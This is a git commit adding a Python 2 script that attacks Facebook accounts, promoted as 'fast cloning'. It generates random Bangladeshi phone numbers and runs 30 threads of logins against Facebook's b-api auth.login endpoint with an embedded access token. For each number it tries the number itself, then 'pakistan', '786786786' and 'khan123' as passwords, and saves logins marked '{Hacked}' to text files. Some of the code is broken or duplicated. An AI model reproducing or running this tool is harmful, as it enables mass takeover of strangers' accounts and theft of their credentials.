4782cdb4ab873ef49324a7af345dd89feb6f610e
sania-queen <95545991+sania-queen@users.noreply.github.com>
2021-12-06 01:03:04 +0000

    Create mb.py

---
+++ mb.py
@@ -0,0 +1,367 @@
+#!/usr/bin/python2
+#coding=utf-8
+#The Credit For This Code Goes Sayyed Zakarya
+#If You Wanna Take Credits For This Code, Please Look Yourself Again...
+#Reserved2020
+import os,sys,time,datetime,random,hashlib,re,threading,json,urllib,cookielib,getpass
+os.system('rm -rf .txt')
+for n in range(2000):
+
+    nmbr = random.randint(1111111, 9999999)
+    
+    sys.stdout = open('.txt', 'a')
+
+    print(nmbr)
+
+    sys.stdout.flush()
+    
+try:
+    import requests
+except ImportError:
+    os.system('pip2 install requests')
+    
+try:
+    import mechanize
+except ImportError:
+    os.system('pip2 install mechanize')
+    time.sleep(1)
+    os.system('python2 Bangla.py')
+
+import os,sys,time,datetime,random,hashlib,re,threading,json,urllib,cookielib,requests,mechanize
+from multiprocessing.pool import ThreadPool
+from requests.exceptions import ConnectionError
+from mechanize import Browser
+
+
+reload(sys)
+sys.setdefaultencoding('utf8')
+br = mechanize.Browser()
+br.set_handle_robots(False)
+br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(),max_time=1)
+br.addheaders = [('User-Agent', 'Opera/9.80 (Android; Opera Mini/32.0.2254/85. U; id) Presto/2.12.423 Version/12.16')]
+br.addheaders = [('user-agent','Dalvik/1.6.0 (Linux; U; Android 4.4.2; NX55 Build/KOT5506) [FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/PosteMobile;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z00AD;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]')]
+def keluar():
+	print 'Subscribe To Aryano Tricks'
+	os.sys.exit()
+
+def acak(b):
+    w = 'ahtdzjc'
+    d = ''
+    for i in x:
+        d += '!'+w[random.randint(0,len(w)-1)]+i
+    return cetak(d)
+
+
+def cetak(b):
+    w = 'ahtdzjc'
+    for i in w:
+        j = w.index(i)
+        x= x.replace('!%s'%i,'\033[%s;1m'%str(31+j))
+    x += '\033[0m'
+    x = x.replace('!0','\033[0m')
+    sys.stdout.write(x+'\n')
+
+
+def jalan(z):
+	for e in z + '\n':
+		sys.stdout.write(e)
+		sys.stdout.flush()
+		time.sleep(0.001)
+
+#### colours ####
+B='\033[1;94m'
+R='\033[1;91m'
+G='\033[1;92m'
+W='\033[1;97m'
+S='\033[1;96m'
+P='\033[1;95m'
+Y='\033[1;93m'
+
+#Dev:Sayyed Zakarya
+##### LOGO #####
+logo = """
+os.system('echo -e "\n\n\033[1;91m  ██████████  \033[1;96m██████████  \033[1;93m█████████  \033[1;92m ▀\n\033[1;91m  ███    ███  \033[1;96m███    ███  \033[1;93m███   ███  \033[1;92m███ \n\033[1;91m  ███         \033[1;96m███    ███  \033[1;93m███   ███  \033[1;92m███ \n\033[1;91m  ██████████  \033[1;96m██████████  \033[1;93m███   ███  \033[1;92m███ \n\033[1;91m         ███  \033[1;96m███    ███  \033[1;93m███   ███  \033[1;92m███  \n\033[1;91m  ███    ███  \033[1;96m███    ███  \033[1;93m███   ███  \033[1;92m███  \n\033[1;91m  ██████████  \033[1;96m███    ███  \033[1;93m███   ███  \033[1;92m███ \x1b[1;90mQUEEN\n\033[1;94m===============================================\n\033[1;90m➣ Author : \033[1;97mSTYLISH QUEEN\n\033[1;90m➣ Github : \033[1;97mhttps://github.com/stylish-queen\n\033[1;90m➣ Fb Page: \033[1;97mJam Shahrukh Official\n\033[1;94m===============================================" | lolcat')
+def tik():
+	titik = ['.   ','..  ','... ']
+	for o in titik:
+		print("\r\x1b[1;93mPlease Wait \x1b[1;93m"+o),;sys.stdout.flush();time.sleep(1)
+
+
+back = 0
+berhasil = []
+cekpoint = []
+oks = []
+id = []
+cpb = []
+listgrup = []
+gagal = []
+idfriends = []
+idfromfriends = []
+idmem = []
+em = []
+emfromfriends = []
+hp = []
+hpfromfriends = []
+reaksi = []
+reaksigrup = []
+komen = []
+komengrup = []
+listgrup = []
+vulnot = "\033[31mNot Vuln"
+vuln = "\033[32mVuln"
+back = 0
+threads = []
+sucessful = []
+checkpoint = []
+oks = []
+action_failed = []
+idfriends = []
+idfromfriends = []
+member_id = []
+email= []
+number = []
+id = []
+em = []
+email_from_friends = []
+hp = []
+hpfromfriends = []
+reaction = []
+reactiongroup = []
+comment = []
+group_comment = []
+listgroup = []
+vulnot = "\033[31mNot Vuln"
+vuln = "\033[32mVuln"
+
+
+##### LICENSE #####
+#=================#
+def lisensi():
+	os.system('clear')
+	login()
+####login#########
+def tik():
+	titik = ['.   ','..  ','... ']
+	for o in titik:
+		print("\r\x1b[1;93mPlease Wait \x1b[1;93m"+o),;sys.stdout.flush();time.sleep(1)
+
+
+back = 0
+berhasil = []
+cekpoint = []
+oks = []
+id = []
+cpb = []
+listgrup = []
+gagal = []
+idfriends = []
+idfromfriends = []
+idmem = []
+em = []
+emfromfriends = []
+hp = []
+hpfromfriends = []
+reaksi = []
+reaksigrup = []
+komen = []
+komengrup = []
+listgrup = []
+vulnot = "\033[31mNot Vuln"
+vuln = "\033[32mVuln"
+back = 0
+threads = []
+sucessful = []
+checkpoint = []
+oks = []
+action_failed = []
+idfriends = []
+idfromfriends = []
+member_id = []
+email= []
+number = []
+id = []
+em = []
+email_from_friends = []
+hp = []
+hpfromfriends = []
+reaction = []
+reactiongroup = []
+comment = []
+group_comment = []
+listgroup = []
+vulnot = "\033[31mNot Vuln"
+vuln = "\033[32mVuln"
+
+
+##### LICENSE #####
+#=================#
+def lisensi():
+	os.system('clear')
+	login()
+####login#########
+def login():
+	os.system('clear')
+	print logo
+        print "\033[1;93m-•◈•-\033[1;91m> \033[1;91m1.\x1b[1;96m Fast Cloning Without Fb ID\033[1;92m[New Update]"
+        time.sleep(0.1)
+        print "\033[1;93m-•◈•-\033[1;91m> \033[1;93m2.\x1b[1;94m Mr-Robot   WhatsApp Group   "
+        time.sleep(0.2)
+        print "\033[1;93m-•◈•-\033[1;91m> \033[1;93m3.\x1b[1;91m Mr-Robot   Youtube Channel   "
+        time.sleep(0.3)
+	print "\033[1;93m-•◈•-\033[1;91m> \033[1;91m0.\033[1;91m Exit             "
+	pilih_login()
+	
+def pilih_login():
+	peak = raw_input("\n\033[1;91mChoose an Option>>> \033[1;95m")
+	if peak =="":
+		print "\x1b[1;91mFill in correctly"
+		pilih_login()
+        elif peak =="1":
+		Robot()
+        elif peak =="2":
+		os.system('xdg-open https://chat.whatsapp.com/C9VZx0EQQJ07TVeW80qgDe')
+	        login()
+        elif peak =="3":
+	        os.system('xdg-open https://www.youtube.com/channel/UCzCZ1fHCMM6xjSfQOZFEmqg?sub_confirmation=1')
+	        login()
+	elif peak =="0":
+		keluar()
+        else:
+		print"\033[1;91m[!] Wrong input"
+		keluar()
+		
+def Robot():
+	os.system('clear')
+	print logo
+	print '\033[1;93m1. Start Cloning Random'
+	print 45*'-'
+	action()
+	
+def action():
+	Robot = raw_input('\n\033[1;91mChoose an Option>>> \033[1;95m')
+	if Robot =='':
+		print '[!] Fill in correctly'
+		action()
+	elif Robot =="1":
+                print (logo)
+		os.system("clear")
+		print (logo)
+		print("\033[1;94m171, 175, 165, 191, 192, 193, 194, 195, 196, 197, 198, 199")
+		try:
+			c = raw_input("\033[1;95m choose code  : ")
+			k="+880"
+			idlist = ('.txt')
+			for line in open(idlist,"r").readlines():
+				id.append(line.strip())
+		except IOError:
+			print ("[!] File Not Found")
+			raw_input("\n[ Back ]")
+			Robot()
+	elif Robot =="0":
+		login()
+	else:
+		print '[!] Fill in correctly'
+		action()
+        os.system('clear')
+	xxx = str(len(id))
+	jalan ('[✓] Total Numbers: '+xxx)
+	 time.sleep(0.05)
+	jalan(' \033[1;93mPlz Wait Cloned Accounts Will Appear Here')
+	time.sleep(0.05)
+	jalan ('[!] To Stop Process Press CTRL Then Press z')
+	time.sleep(0.05)
+	print 44*'-'
+	print (logo)
+	
+			
+	def main(arg):
+		global cpb,oks
+		user = arg
+		try:
+			os.mkdir('save')
+		except OSError:
+			pass
+		try:
+			pass1 = user
+			data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' +k+c+user+ '&locale=en_US&password=' + pass1 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
+			q = json.load(data)
+			if 'access_token' in q:
+				print '\x1b[1;92m{Hacked}  ' + k + c + user + '  》  ' + pass1+'\n'+"\n"
+				okb = open('save/successfull.txt', 'a')
+				okb.write(k+c+user+'-•◈•-'+pass1+'\n')
+				okb.close()
+				oks.append(c+user+pass1)
+			else:
+				if 'www.facebook.com' in q['error_msg']:
+					print '\033[1;96m[24Hours] ' + k + c + user + '  》  ' + pass1+'\n'
+					cps = open('save/checkpoint.txt', 'a')
+					cps.write(k+c+user+'-•◈•-'+pass1+'\n')
+					cps.close()
+					cpb.append(c+user+pass1)
+ 				else:
+ 				    pass2="pakistan"
+ 				    data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' +k+c+user+ '&locale=en_US&password=' + pass2 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
+ 				    q = json.load(data)
+ 				    if 'access_token' in q:
+ 				        print '\x1b[1;92m{Hacked}  ' + k + c + user + '  》  ' + pass2+'\n'+"\n"
+ 				        okb = open('save/successfull.txt', 'a')
+ 				        okb.write(k+c+user+'-•◈•-'+pass2+'\n')
+ 				        okb.close()
+ 				        oks.append(c+user+pass2)
+ 				    else:
+ 				        if 'www.facebook.com' in q['error_msg']:
+ 					        print '\033[1;96m[24Hours] ' + k + c + user + '  》  ' + pass2+'\n'
+ 					        cps = open('save/checkpoint.txt', 'a')
+ 					        cps.write(k+c+user+'-•◈•-'+pass2+'\n')
+ 					        cps.close()
+ 					        cpb.append(c+user+pass2)
+                                        else:
+ 				            pass3="786786786"
+ 				            data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' +k+c+user+ '&locale=en_US&password=' + pass3 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
+ 				            q = json.load(data)
+ 				            if 'access_token' in q:
+ 				                print '\x1b[1;92m{Hacked}  ' + k + c + user + '  》  ' + pass3+'\n'+"\n"
+ 				                okb = open('save/successfull.txt', 'a')
+ 				                okb.write(k+c+user+'-•◈•-'+pass3+'\n')
+ 				                okb.close()
+ 				                oks.append(c+user+pass3)
+ 				            else:
+ 				                if 'www.facebook.com' in q['error_msg']:
+ 					                print '\033[1;96m[24Hours] ' + k + c + user + '  》  ' + pass3+'\n'
+ 					                cps = open('save/checkpoint.txt', 'a')
+ 					                cps.write(k+c+user+'-•◈•-'+pass3+'\n')
+ 					                cps.close()
+ 					                cpb.append(c+user+pass3)
+                                                else:
+ 				                    pass4="khan123"
+ 				                    data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' +k+c+user+ '&locale=en_US&password=' + pass4 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
+ 				                    q = json.load(data)
+ 				                    if 'access_token' in q:
+ 				                        print '\x1b[1;92m{Hacked}  ' + k + c + user + '  》  ' + pass4+'\n'+"\n"
+ 				                        okb = open('save/successfull.txt', 'a')
+ 				                        okb.write(k+c+user+'-•◈•-'+pass4+'\n')
+ 				                        okb.close()
+ 				                        oks.append(c+user+pass4)
+ 				                    else:
+ 				                        if 'www.facebook.com' in q['error_msg']:
+ 					                        print '\033[1;96m[24Hours] ' + k + c + user + '  》  ' + pass4+'\n'
+ 					                        cps = open('save/checkpoint.txt', 'a')
+ 					                        cps.write(k+c+user+'-•◈•-'+pass4+'\n')
+ 					                        cps.close()
+ 					                        cpb.append(c+user+pass4)
+																	
+															
+		except:
+			pass
+		
+	p = ThreadPool(30)
+	p.map(main, id)
+	print 44*'-'
+	print '[✓] Process Has Been Completed ....'
+	print '[✓] Total OK/CP : '+str(len(oks))+'/'+str(len(cpb))
+	print('[✓] CP File Has Been Saved : save/checkpoint.txt')
+	raw_input("\n\033[1;95m[\033[1;91mBack\033[1;95m]")
+	Robot()	
+          
+if __name__ == '__main__':
+	login()
